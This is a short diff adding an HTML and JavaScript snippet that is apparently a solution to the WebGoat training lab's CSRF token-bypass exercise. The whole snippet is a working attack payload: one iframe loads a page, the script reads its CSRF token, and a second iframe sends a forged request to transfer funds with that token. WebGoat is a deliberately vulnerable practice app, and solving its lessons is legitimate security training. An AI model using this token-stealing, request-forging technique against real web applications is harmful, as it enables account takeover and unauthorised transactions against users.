@@ -1,0 +1,15 @@
+<script>
+var readToken = function(){
+var doc = document.getElementById("frame1").contentDocument
+var token = doc.getElementsByName("CSRFToken")[0].getAttribute("value");
+alert(token);
+var frame2 = document.getElementById("frame2");
+frame2.src = "http://localhost/WebGoat/attack?Screen=2&menu=900&transferFunds=4000&token="+token;
+}
+</script>
+
+<iframe id="frame2" >
+</iframe>
+
+<iframe id="frame1" onload="readToken()" src="http://localhost/WebGoat/attack?Screen=2&menu=900&transfer=main" >
+</iframe>
